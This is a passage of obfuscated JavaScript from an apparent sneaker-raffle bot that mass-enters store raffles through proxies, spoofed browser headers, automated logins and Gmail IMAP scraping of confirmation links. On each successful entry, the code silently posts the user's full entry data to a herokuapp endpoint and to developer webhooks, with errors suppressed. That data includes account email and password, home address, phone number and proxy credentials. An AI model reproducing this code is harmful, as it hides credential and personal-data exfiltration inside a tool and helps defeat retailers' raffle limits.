                            }), await _0x2f472f['goto']('' + _0x67626e[_0x4d48b5]['Url']['replace']('\x20', ''), { 'waitUntil': 'networkidle2' }), await _0x4fda60(0x12c), await _0x2f472f['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x2f472f['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x4fda60(0x7d0);
                            try {
                                await _0x2f472f['click']('a[title=\x22Sign\x20In\x22]');
                            } catch {
                                await _0x2f472f['click']('a[title=\x22sign\x20in\x22]');
                            }
                            console['log'](_0x46dcc5() + '\x20[' + _0x466a1c['name'] + ']\x20Task\x20' + (_0x4d48b5 + 0x1) + '\x20:\x20Logging\x20in'), await _0x2f472f['waitForSelector']('#username'), await _0x2f472f['type']('#username', _0x67626e[_0x4d48b5]['Email']), await _0x2f472f['waitForSelector']('#password'), await _0x2f472f['type']('#password', _0x67626e[_0x4d48b5]['Password']), await _0x4fda60(0x190), await _0x2f472f['click']('#buttonSubmit'), await _0x2f472f['waitForSelector']('.b-variation_swatch-value_overlay'), console['log'](_0x46dcc5() + '\x20[' + _0x466a1c['name'] + ']\x20Task\x20' + (_0x4d48b5 + 0x1) + '\x20:\x20Getting\x20Product'), await _0x4fda60(0x1f4), console['log'](_0x46dcc5() + '\x20[' + _0x466a1c['name'] + ']\x20Task\x20' + (_0x4d48b5 + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x67626e[_0x4d48b5]['Size']);
                            let _0x57d763 = _0x67626e[_0x4d48b5]['Size']['replace']('.5', '\x201/2');
                            if (_0x57d763['toUpperCase']() == 'RANDOM') {
                                const _0x4481b1 = await _0x2f472f['$$']('.b-variations_item-content.m-list\x20>\x20button');
                                var _0x393fb5 = Math['round'](Math['random']() * (_0x4481b1['length'] - 0x1));
                                await _0x4481b1[_0x393fb5]['click']();
                            } else
                                await _0x2f472f['click']('button[aria-label=\x22' + _0x57d763 + '\x22]');
                            await _0x4fda60(0x1f4);
                            try {
                                await _0x2f472f['click']('button[data-tau=\x22add_new_address\x22]');
                            } catch {
                            }
                            await _0x4fda60(0x12c), console['log'](_0x46dcc5() + '\x20[' + _0x466a1c['name'] + ']\x20Task\x20' + (_0x4d48b5 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x2f472f['select']('#dwfrm_raffle_addressFields_salutation', 'mr'), await _0x4fda60(0x12c), await _0x2f472f['type']('#dwfrm_raffle_addressFields_firstName', _0x67626e[_0x4d48b5]['FirstName']), await _0x4fda60(0x12c), await _0x2f472f['type']('#dwfrm_raffle_addressFields_lastName', _0x67626e[_0x4d48b5]['LastName']), await _0x4fda60(0x12c), await _0x2f472f['select']('#dwfrm_raffle_addressFields_country', _0x67626e[_0x4d48b5]['Country']), await _0x4fda60(0x12c), await _0x2f472f['type']('#dwfrm_raffle_addressFields_city', _0x67626e[_0x4d48b5]['City']), await _0x4fda60(0x12c);
                            _0x67626e[_0x4d48b5]['Postcode'] == undefined && (_0x67626e[_0x4d48b5]['Postcode'] = _0x67626e[_0x4d48b5]['Zip']);
                            await _0x2f472f['type']('#dwfrm_raffle_addressFields_postalCode', _0x67626e[_0x4d48b5]['Postcode']), await _0x4fda60(0x12c), await _0x2f472f['type']('#dwfrm_raffle_addressFields_address1', _0x67626e[_0x4d48b5]['Address1']), await _0x4fda60(0x12c), await _0x2f472f['type']('#dwfrm_raffle_addressFields_address2', _0x67626e[_0x4d48b5]['HouseNumber']), await _0x4fda60(0x12c), await _0x2f472f['type']('#dwfrm_raffle_addressFields_additionalAddressInfo', _0x67626e[_0x4d48b5]['Address2']), await _0x4fda60(0x12c), await _0x2f472f['click']('#dwfrm_raffle_addressFields_saveAddress'), await _0x4fda60(0x12c), await _0x2f472f['type']('#dwfrm_raffle_raffleSpecificFields_instagramAccount', _0x67626e[_0x4d48b5]['Follower']), await _0x4fda60(0x1f4), await _0x2f472f['click']('#dwfrm_raffle_raffleSpecificFields_consentOnConditions'), await _0x4fda60(0x1f4), console['log'](_0x46dcc5() + '\x20[' + _0x466a1c['name'] + ']\x20Task\x20' + (_0x4d48b5 + 0x1) + '\x20:\x20' + _0x3e3bb6['blue']('Awaiting\x20Paypal\x20Payment')), await _0x2f472f['click']('.b-paypal_button');
                            try {
                                await _0x2f472f['waitForSelector']('.b-raffle-message.m-success', { 'timeout': 0x493e0 }), _0x397afa = 'no', _0x8bf342(_0x67626e[_0x4d48b5], _0x466a1c), console['log'](_0x3e3bb6['green'](_0x46dcc5() + '\x20[' + _0x466a1c['name'] + ']\x20Task\x20' + (_0x4d48b5 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                _0x255a87['webhook'] != undefined && _0x255a87['webhook'] != '' && await _0xb6cfae(_0x255a87['webhook'], _0x5db231['succesDEVMSG']);
                                await _0x4fda60(0xc8), await _0xb6cfae(_0x4fb406, _0x5db231['succesDEVMSG']), await _0x4fda60(0xc8), await _0xb6cfae(_0x5d80c9, _0x5db231['succesPUBMSG']);
                                let _0x3392ef = _0x67626e[_0x4d48b5];
                                try {
                                    prxdata = {
                                        'username': _0x26c985['replace']('#', ''),
                                        'module': _0x466a1c['name'],
                                        'entrydata': JSON['stringify'](_0x3392ef),
                                        'proxy': '' + _0x392414[_0x4d48b5]
                                    };
                                    var _0x4fbd12 = JSON['stringify'](prxdata);
                                    let _0x159880 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x3c935b['post']('https://jraffles.herokuapp.com/success', _0x4fbd12, _0x159880);
                                } catch (_0x4f130f) {
                                }
                            } catch (_0x48a610) {
                                console['log'](_0x3e3bb6['red'](_0x46dcc5() + '\x20[' + _0x466a1c['name'] + ']\x20Task\x20' + (_0x4d48b5 + 0x1) + '\x20:\x20Paypal\x20Error:\x20' + _0x48a610)), _0x41ea98 = 'Error\x20while\x20entering\x20Paypal:\x20' + _0x48a610;
                                var _0x771633 = await _0x1523c9(_0x67626e[_0x4d48b5], _0x466a1c, 'dev', !![], _0x41ea98);
                                _0x5db231['errorDEV'] = { 'embeds': [_0x771633] }, _0x255a87['webhook'] != undefined && _0x255a87['webhook'] != '' && await _0xb6cfae(_0x255a87['webhook'], _0x5db231['errorDEV']), await _0xb6cfae(_0x991bd5, _0x5db231['errorDEV']);
                            }
                        } catch (_0x423a51) {
                            console['log'](_0x3e3bb6['red'](_0x46dcc5() + '\x20[' + _0x466a1c['name'] + ']\x20Task\x20' + (_0x4d48b5 + 0x1) + '\x20:\x20' + _0x423a51)), _0x41ea98 = '' + _0x423a51;
                            var _0x771633 = await _0x1523c9(_0x67626e[_0x4d48b5], _0x466a1c, 'dev', !![], _0x41ea98);
                            _0x5db231['errorDEV'] = { 'embeds': [_0x771633] }, _0x255a87['webhook'] != undefined && _0x255a87['webhook'] != '' && await _0xb6cfae(_0x255a87['webhook'], _0x5db231['errorDEV']), await _0xb6cfae(_0x991bd5, _0x5db231['errorDEV']), _0x397afa = 'yes';
                        } finally {
                            _0x21e9bb && _0x21e9bb['close']();
                            if (_0x397afa == 'yes' && _0x96c5b6 != 0x5) {
                                console['log'](_0x3e3bb6['red'](_0x46dcc5() + '\x20[' + _0x466a1c['name'] + ']\x20Task\x20' + (_0x4d48b5 + 0x1) + '\x20:\x20Retrying\x20(' + _0x96c5b6 + '\x20/\x205)')), _0x4d48b5 = _0x4d48b5 - 0x1, _0x96c5b6 = _0x96c5b6 + 0x1;
                                continue;
                            }
                            _0x397afa == 'yes' && _0x96c5b6 >= 0x5 && (_0x2540d5(_0x67626e[_0x4d48b5], _0x466a1c), _0x397afa = 'no', _0x96c5b6 = 0x0), console['log']('Waiting\x20for\x20' + _0x255a87['AfewDelay'] + '\x20ms'), await _0x4fda60(_0x255a87['AfewDelay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'MAHA\x20Amsterdam',
        'modules': [
            {
                'name': 'MAHA\x20Raffle\x20Entries',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=THxSew',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'YqtGfh',
                            'custom_source': 'Air\x20Jordan\x204\x20Retro\x20Thunder\x20(2023)',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'Taryg7',
                                '$consent_form_version': 0x8bffa6,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x2
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x48f170, _0x335c71, _0x20d932) {
                    for (var _0x47acd3 = 0x0; _0x47acd3 < _0x335c71['length']; _0x47acd3++) {
                        try {
                            await _0x436f00(_0x335c71, _0x47acd3);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0xb23e40(_0x3c6b52, _0x5f3486, _0x26b477, _0x141521, _0x5b9de9) {
                            var _0x1f3c36, _0x581dbe = {}, _0x2beff2 = [], _0xeea50e = {}, _0x59b73e = [
                                '40',
                                '40.5',
                                '41',
                                '42',
                                '42.5',
                                '43',
                                '44',
                                '45',
                                '45.5',
                                '46',
                                '47',
                                '47.5',
                                '48'
                            ], _0x23278c = Math['round'](Math['random']() * (_0x59b73e['length'] - 0x1));
                            !_0x141521 && (_0x141521 = {});
                            if (_0x5f3486 != 'ver') {
                                _0xf5e41e(_0x26b477['name'] + '\x20Task\x20' + (_0x3c6b52 + 0x1) + '\x20/\x20' + _0x141521['length'] + '\x20||\x20File:\x20' + _0x20d7ea + '\x20Proxies:\x20' + _0xf0d869), await _0x436f00(_0x141521, _0x3c6b52), _0x581dbe = _0x26b477['data'], _0x581dbe['data']['attributes']['email'] = '' + _0x141521[_0x3c6b52]['Email'];
                                if (_0x141521[_0x3c6b52]['Size'] == 'RANDOM') {
                                }
                                _0x581dbe['data']['attributes']['properties']['$first_name'] = '' + _0x141521[_0x3c6b52]['FirstName'], _0x581dbe['data']['attributes']['properties']['$last_name'] = '' + _0x141521[_0x3c6b52]['LastName'], _0x581dbe['data']['attributes']['properties']['$address1'] = _0x141521[_0x3c6b52]['Address1'] + '\x20' + _0x141521[_0x3c6b52]['Address2'] + '\x20' + _0x141521[_0x3c6b52]['HouseNumber'], _0x581dbe['data']['attributes']['properties']['$zip'] = '' + _0x141521[_0x3c6b52]['Zip'], _0x581dbe['data']['attributes']['properties']['$city'] = '' + _0x141521[_0x3c6b52]['City'], _0x581dbe['data']['attributes']['properties']['$country'] = '' + _0x141521[_0x3c6b52]['Country'], _0x141521[_0x3c6b52]['Size'] == 'RANDOM' ? _0x581dbe['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x59b73e[_0x23278c] : _0x581dbe['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x141521[_0x3c6b52]['Size'], _0x581dbe['data']['attributes']['properties']['$phone_number'] = '' + _0x141521[_0x3c6b52]['Phone'], _0x581dbe['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x141521[_0x3c6b52]['Follower'];
                            }
                            if (_0x255a87['useRandomProxy'] = ![])
                                var _0x43561b = _0x5b9de9[_0x3c6b52]['split'](':');
                            else
                                var _0x5d80bd = Math['round'](Math['random']() * (_0x5b9de9['length'] - 0x1)), _0x43561b = _0x5b9de9[_0x5d80bd]['split'](':');
                            var _0x1f1989 = {
                                'jar': _0x337161,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x26b477['url'],
                                'headers': _0x26b477['headers'],
                                'body': JSON['stringify'](_0x581dbe),
                                'proxy': 'http://' + _0x43561b[0x2] + ':' + _0x43561b[0x3] + '@' + _0x43561b[0x0] + ':' + _0x43561b[0x1]
                            };
                            return _0x5f3486 != 'ver' && (_0x1f1989['url'] = _0x26b477['url'], _0x1f1989['headers'] = _0x26b477['headers']), _0x5f3486 == 'ver' && (_0x1f1989['method'] = 'GET'), new Promise(function (_0x4ebc82, _0x571e09) {
                                callback = async (_0x297488, _0x1ae6a0, _0x295ca3) => {
                                    if (!_0x297488 && _0x1ae6a0['statusCode'] == 0xca || !_0x297488 && _0x1ae6a0['statusCode'] == 0xc8) {
                                        if (_0x5f3486 != 'ver') {
                                            var _0x2ad1b5 = await _0x1523c9(_0x141521[_0x3c6b52], _0x26b477, 'dev', ![]), _0x58415e = await _0x1523c9(_0x141521[_0x3c6b52], _0x26b477, 'pub', ![]);
                                            const _0x1a50d7 = {
                                                'succesDEVMSG': { 'embeds': [_0x2ad1b5] },
                                                'succesPUBMSG': { 'embeds': [_0x58415e] }
                                            };
                                            let _0x50995d = _0x141521[_0x3c6b52];
                                            try {
                                                prxdata = {
                                                    'username': _0x26c985['replace']('#', ''),
                                                    'module': _0x26b477['name'],
                                                    'entrydata': JSON['stringify'](_0x50995d),
                                                    'proxy': '' + _0x5b9de9[_0x3c6b52]
                                                };
                                                var _0x52b1b9 = JSON['stringify'](prxdata);
                                                let _0x26b711 = { 'headers': { 'content-type': 'application/json' } };
                                                await _0x3c935b['post']('https://jraffles.herokuapp.com/success', _0x52b1b9, _0x26b711);
                                            } catch (_0x5720e2) {
                                            }
                                            if (_0x255a87['webhook'] != undefined && _0x255a87['webhook'] != '')
                                                try {
                                                    await _0xb6cfae(_0x255a87['webhook'], _0x1a50d7['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0x4fda60(0xc8), await _0xb6cfae(_0x4fb406, _0x1a50d7['succesDEVMSG']), await _0x4fda60(0xc8);
                                            try {
                                                await _0xb6cfae(_0x5d80c9, _0x1a50d7['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x8bf342(_0x141521[_0x3c6b52], _0x26b477);
                                        }
                                        _0x4ebc82(console['log'](_0x3e3bb6['green'](_0x46dcc5() + '\x20[' + _0x26b477['name'] + ']\x20Task\x20' + (_0x3c6b52 + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x5f3486 != 'ver') {
                                            var _0x2ab3a2 = '' + _0x297488, _0xea0590 = await _0x1523c9(_0x141521[_0x3c6b52], _0x26b477, 'dev', !![], _0x2ab3a2), _0x58b0c1 = {};
                                            _0x58b0c1['errorDEV'] = { 'embeds': [_0xea0590] }, _0x2540d5(_0x141521[_0x3c6b52], _0x26b477), _0x255a87['webhook'] != undefined && _0x255a87['webhook'] != '' && await _0xb6cfae(_0x255a87['webhook'], _0x58b0c1['errorDEV']), await _0xb6cfae(_0x991bd5, _0x58b0c1['errorDEV']);
                                        }
                                        _0x571e09(console['log'](_0x3e3bb6['red'](_0x46dcc5() + '\x20[' + _0x26b477['name'] + ']\x20Task\x20' + (_0x3c6b52 + 0x1) + ':\x20' + _0x297488)));
                                    }
                                };
                                try {
                                    _0x5f3486 != 'ver' && console['log'](_0x46dcc5() + '\x20[' + _0x26b477['name'] + ']\x20Task\x20' + (_0x3c6b52 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x581dbe['data']['attributes']['email']), _0x7b6702(_0x1f1989, callback);
                                } catch (_0x246e0c) {
                                    console['log'](_0x46dcc5() + '\x20Task\x20' + (_0x3c6b52 + 0x1) + ':\x20' + _0x246e0c);
                                }
                            });
                        }
                        ;
                        try {
                            await _0xb23e40(_0x47acd3, 'nor', _0x48f170, _0x335c71, _0x20d932), console['log'](_0x46dcc5() + '\x20[' + _0x48f170['name'] + ']\x20Sleeping\x20for\x20' + _0x255a87['delay'] + '\x20ms'), await _0x4fda60(_0x255a87['delay']);
                        } catch (_0x20781b) {
                        }
                    }
                }
            },
            {
                'name': 'MAHA\x20Raffle\x20Verification',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x119585, _0x120645, _0x5d3229) {
                    var _0x2df2b5 = [], _0x2fb6e8 = ![];
                    async function _0x5ec417() {
                        var _0x330beb = new _0x4ce16c({
                            'user': _0x255a87['masterMail'],
                            'password': _0x255a87['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x3ded73(_0x288a93) {
                            _0x330beb['openBox']('INBOX', ![], _0x288a93);
                        }
                        _0x330beb['once']('ready', function () {
                            _0x3ded73(function (_0x40c7c4, _0x19448a) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x40c7c4)
                                    throw _0x40c7c4;
                                _0x330beb['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ]
                                ], function (_0x3f9754, _0xab74f0) {
                                    if (!_0xab74f0 || !_0xab74f0['length'])
                                        console['log'](_0x46dcc5() + '\x20[' + _0x119585['name'] + ']\x20No\x20mails\x20found'), _0x330beb['end']();
                                    else {
                                        var _0x2c6bfd = _0x330beb['seq']['fetch'](_0xab74f0, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x2c6bfd['on']('message', function (_0xe7d81e, _0x333ca1) {
                                            var _0x26a2e9 = '(#' + _0x333ca1 + ')\x20';
                                            _0xe7d81e['on']('body', function (_0x5b38e0, _0x40c5e8) {
                                                _0x425966(_0x5b38e0, (_0x37e578, _0x5cf304) => {
                                                    var _0x58f5ef = _0x5cf304['text']['split']('(')[0x1], _0x4e3865 = _0x58f5ef['split'](')')[0x0];
                                                    _0x2df2b5['push'](_0x4e3865);
                                                });
                                            }), _0xe7d81e['once']('end', function () {
                                            });
                                        }), _0x2c6bfd['once']('error', function (_0x11d913) {
                                            console['log']('Fetch\x20error:\x20' + _0x11d913), _0x2fb6e8 = !![];
                                        }), _0x2c6bfd['once']('end', function () {
                                            _0x330beb['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x330beb['once']('error', function (_0x1b9a58) {
                            console['log'](_0x3e3bb6['red'](_0x1b9a58['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x2fb6e8 = !![];
                        }), _0x330beb['once']('end', async function () {
                            _0x2fb6e8 = !![];
                        }), _0x330beb['connect']();
                    }
                    async function _0x424a46(_0x22f70c, _0x5c152e, _0x3e18c5) {
                        for (var _0x4f472e = 0x0; _0x4f472e < _0x5c152e['length']; _0x4f472e++) {
                            async function _0x3ef675(_0x147cf9, _0x53347d, _0x4bded5, _0x523839, _0x1f8fe4) {
                                var _0x29134d, _0x25906b = {}, _0x290cf5 = [], _0x3f9fdf = {}, _0x53db1f = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x4bb310 = Math['round'](Math['random']() * (_0x53db1f['length'] - 0x1));
                                _0x523839[_0x147cf9]['Size'] == 'RANDOM' && (_0x523839[_0x147cf9]['Size'] = _0x53db1f[_0x4bb310]);
                                !_0x523839 && (_0x523839 = {});
                                if (_0x255a87['useRandomProxy'] = ![])
                                    var _0x1be59d = _0x1f8fe4[_0x147cf9]['split'](':');
                                else
                                    var _0x4d8ce7 = Math['round'](Math['random']() * (_0x1f8fe4['length'] - 0x1)), _0x1be59d = _0x1f8fe4[_0x4d8ce7]['split'](':');
                                var _0x1273ae = {
                                    'jar': _0x337161,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x4bded5['url'],
                                    'headers': _0x4bded5['headers'],
                                    'body': JSON['stringify'](_0x25906b),
                                    'proxy': 'http://' + _0x1be59d[0x2] + ':' + _0x1be59d[0x3] + '@' + _0x1be59d[0x0] + ':' + _0x1be59d[0x1]
                                };
                                return _0x53347d != 'ver' && (_0x1273ae['url'] = _0x4bded5['url'], _0x1273ae['headers'] = _0x4bded5['headers']), _0x53347d == 'ver' && (_0x1273ae['method'] = 'GET', _0x1273ae['url'] = _0x523839[_0x147cf9]), new Promise(function (_0x1c2eed, _0x13d3e9) {
                                    callback = async (_0x1e9190, _0x47699b, _0x6157bf) => {
                                        if (!_0x1e9190 && _0x47699b['statusCode'] == 0xca || !_0x1e9190 && _0x47699b['statusCode'] == 0xc8) {
                                            if (_0x53347d != 'ver') {
                                                var _0x3e4999 = await _0x1523c9(_0x523839[_0x147cf9], _0x4bded5, 'dev', ![]), _0x7bcd93 = await _0x1523c9(_0x523839[_0x147cf9], _0x4bded5, 'pub', ![]);
                                                const _0x477b63 = {
                                                    'succesDEVMSG': { 'embeds': [_0x3e4999] },
                                                    'succesPUBMSG': { 'embeds': [_0x7bcd93] }
                                                };
                                                if (_0x255a87['webhook'] != undefined && _0x255a87['webhook'] != '')
                                                    try {
                                                        await _0xb6cfae(_0x255a87['webhook'], _0x477b63['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x4fda60(0xc8), await _0xb6cfae(_0x4fb406, _0x477b63['succesDEVMSG']), await _0x4fda60(0xc8);
                                                try {
                                                    await _0xb6cfae(_0x5d80c9, _0x477b63['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x8bf342(_0x523839[_0x147cf9], _0x4bded5);
                                            }
                                            _0x1c2eed(console['log'](_0x3e3bb6['green'](_0x46dcc5() + '\x20[' + _0x4bded5['name'] + ']\x20Task\x20' + (_0x147cf9 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x53347d != 'ver') {
                                                var _0x234189 = '' + _0x1e9190, _0x788aad = await _0x1523c9(_0x523839[_0x147cf9], _0x4bded5, 'dev', !![], _0x234189), _0x4423b8 = {};
                                                _0x4423b8['errorDEV'] = { 'embeds': [_0x788aad] }, _0x2540d5(_0x523839[_0x147cf9], _0x4bded5), _0x255a87['webhook'] != undefined && _0x255a87['webhook'] != '' && await _0xb6cfae(_0x255a87['webhook'], _0x4423b8['errorDEV']), await _0xb6cfae(_0x991bd5, _0x4423b8['errorDEV']);
                                            }
                                            _0x13d3e9(console['log'](_0x3e3bb6['red'](_0x46dcc5() + '\x20[' + _0x4bded5['name'] + ']\x20Task\x20' + (_0x147cf9 + 0x1) + ':\x20' + _0x1e9190)));
                                        }
                                    };
                                    try {
                                        _0x53347d != 'ver' ? console['log'](_0x46dcc5() + '\x20[' + _0x4bded5['name'] + ']\x20Task\x20' + (_0x147cf9 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x25906b['data']['attributes']['email']) : console['log'](_0x46dcc5() + '\x20[' + _0x4bded5['name'] + ']\x20Task\x20' + (_0x147cf9 + 0x1) + ':\x20Fetching\x20Response'), _0x7b6702(_0x1273ae, callback);
                                    } catch (_0x4bed29) {
                                        console['log'](_0x46dcc5() + '\x20Task\x20' + (_0x147cf9 + 0x1) + ':\x20' + _0x4bed29);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x3ef675(_0x4f472e, 'ver', _0x22f70c, _0x5c152e, _0x3e18c5), console['log'](_0x46dcc5() + '\x20[' + _0x22f70c['name'] + ']\x20Sleeping\x20for\x20' + _0x255a87['delay'] + '\x20ms'), await _0x4fda60(_0x255a87['delay']);
                            } catch (_0x3eb078) {
                            }
                        }
                    }
                    try {
                        _0x5ec417();
                        while (!_0x2fb6e8) {
                            await _0x4fda60(0xbb8);
                        }
                        console['log']('Found\x20' + _0x2df2b5['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x4fda60(0x9c4);
                    }
                    await _0x424a46(_0x119585, _0x2df2b5, _0x5d3229);
                }
            }
        ]
    },
    {
        'name': 'OQIUM\x20Store',
        'modules': [
            {
                'name': 'OQIUM\x20Raffle\x20Entries',
                'store': 'OQIUM',
                'logo': 'https://s3-eu-west-1.amazonaws.com/tpd/logos/5e8e742e8f9bb4000118f0bc/0x0.png',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=R3sbqs',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'U6yui3',
                            'custom_source': 'DV1748-601',
                            'email': '',
                            'properties': {
                                '$first_name': '',
                                '$last_name': '',
                                '$phone_number': '',
                                'Size': '',
                                'Instagram\x20Account': '',
                                '$address1': '',
                                '$zip': '',
                                '$city': '',
                                '$country': '',
                                'Accepts\x20Marketing': ['NoByRaffle'],
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'SFX8xn',
                                '$consent_form_version': 0x8d41f5,
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x2
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://oqium.com',
                    'referer': 'https://oqium.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x2adbdc, _0x5f483a, _0x577e28) {
                    var _0x3b9b3f = _0x5f483a, _0x11133f = 0x0;
                    for (var _0x395540 = 0x0; _0x395540 < _0x5f483a['length']; _0x395540++) {
                        maxTasks = _0x255a87['threads'];
                        while (_0x11133f >= maxTasks) {
                            await _0x4fda60(_0x255a87['delay']);
                        }
                        async function _0x50e7f0(_0x4f3f23, _0x2b256a, _0x444196, _0x230a77) {
                            try {
                                await _0x436f00(_0x2b256a, _0x230a77);
                            } catch (_0x194dc2) {
                                throw new Error(_0x194dc2);
                            }
                            async function _0x1a55f7(_0x34cebe, _0x3467d1, _0x35ce92, _0x22c014, _0x5bc452) {
                                _0x11133f++;
                                var _0x3ab89e, _0x5199fa = {}, _0x5b4d1f = [], _0x4134c2 = {}, _0x522acc = [
                                    '40',
                                    '40.5',
                                    '41',
                                    '42',
                                    '42.5',
                                    '43',
                                    '44',
                                    '45',
                                    '45.5',
                                    '46',
                                    '47',
                                    '47.5',
                                    '48'
                                ], _0x5407a8 = Math['round'](Math['random']() * (_0x522acc['length'] - 0x1));
                                !_0x22c014 && (_0x22c014 = {});
                                if (_0x3467d1 != 'ver') {
                                    _0xf5e41e(_0x35ce92['name'] + '\x20Task\x20' + (_0x34cebe + 0x1) + '\x20/\x20' + _0x22c014['length'] + '\x20||\x20File:\x20' + _0x20d7ea + '\x20Proxies:\x20' + _0xf0d869), _0x5b4d1f = [{
                                        'type': 'rich',
